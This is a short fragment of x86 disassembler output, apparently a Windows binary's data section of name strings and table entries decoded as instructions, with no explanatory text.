  423a65:	add    BYTE PTR [eax+eax*1+0x33],cl
  423a69:	add    BYTE PTR [edx+0x0],dl
  423a6c:	xor    al,0x0
  423a6e:	dec    eax
  423a6f:	add    BYTE PTR [eax],al
  423a71:	add    BYTE PTR [ebp+0x0],dl
  423a74:	add    BYTE PTR ss:[ebp+0x0],cl
  423a78:	xor    DWORD PTR [eax],eax
  423a7a:	pop    edi
  423a7b:	add    BYTE PTR [esi],dh
  423a7d:	add    BYTE PTR [ecx+0x0],bl
  423a80:	push   ebp
  423a81:	add    BYTE PTR [eax+eax*1+0x5f],dl
  423a85:	add    BYTE PTR [edi+0x0],cl
  423a88:	inc    esp
  423a89:	add    BYTE PTR [edi+0x0],dl
  423a8c:	push   ebx
  423a8d:	add    BYTE PTR [eax],al
  423a8f:	add    BYTE PTR [edx+0x0],bl
  423a92:	inc    ebx
  423a93:	add    BYTE PTR [ebp+0x0],dl
  423a96:	pop    edi
  423a97:	add    BYTE PTR [ecx],dh
  423a99:	add    BYTE PTR [ebp+0x0],al
  423a9c:	push   esp
  423a9d:	add    BYTE PTR [eax],dh
  423a9f:	add    BYTE PTR [eax],al
  423aa1:	add    BYTE PTR [eax],al
  423aa3:	add    BYTE PTR [eax],al
  423aa5:	add    BYTE PTR [eax-0x7ffbffbe],al
  423aab:	inc    edx
  423aac:	add    BYTE PTR [eax],cl
  423aae:	add    BYTE PTR [edx+0x0],0xc
  423ab2:	add    BYTE PTR [edx+0x0],0x10
  423ab6:	add    BYTE PTR [edx+0x0],0x14
  423aba:	add    BYTE PTR [edx+0x0],0x18
  423abe:	add    BYTE PTR [edx+0x0],0x1c
  423ac2:	add    BYTE PTR [edx+0x0],0x20
  423ac6:	add    BYTE PTR [edx+0x0],0x24
  423aca:	add    BYTE PTR [edx+0x0],0x28
  423ace:	add    BYTE PTR [edx+0x0],0x0
	...
  423ae2:	add    BYTE PTR [eax],al
  423ae4:	sbb    edi,DWORD PTR [edi+0x4d57]
  423aea:	add    BYTE PTR [eax],al
  423aec:	adc    bh,BYTE PTR [ebx]
  423aee:	add    al,BYTE PTR [eax]
  423af0:	add    DWORD PTR [eax],eax
  423af2:	add    BYTE PTR [eax],al
  423af4:	add    DWORD PTR [eax],eax
  423af6:	add    BYTE PTR [eax],al
  423af8:	add    DWORD PTR [eax],eax
  423afa:	add    BYTE PTR [eax],al
  423afc:	or     BYTE PTR [ebx],bh
  423afe:	add    al,BYTE PTR [eax]
  423b00:	or     al,0x3b
  423b02:	add    al,BYTE PTR [eax]
  423b04:	adc    BYTE PTR [ebx],bh
  423b06:	add    al,BYTE PTR [eax]
  423b08:	inc    esi
  423b09:	iret   
  423b0a:	add    BYTE PTR [eax],al
  423b0c:	push   ds
  423b0d:	cmp    eax,DWORD PTR [edx]
  423b0f:	add    BYTE PTR [eax],al
  423b11:	add    BYTE PTR [edi+0x6f],dl
  423b14:	jb     0x423b7a
  423b16:	push   edi
  423b17:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  423b1e:	aas    
  423b1f:	inc    ebp
  423b20:	outs   dx,BYTE PTR ds:[esi]
  423b21:	jne    0x423b90
  423b23:	push   edi
  423b24:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  423b2b:	popa   
  423b2c:	je     0x423b97
  423b2e:	outs   dx,DWORD PTR ds:[esi]
  423b2f:	outs   dx,BYTE PTR ds:[esi]
  423b30:	jae    0x423b85
  423b32:	je     0x423b95
  423b34:	.byte 0x74
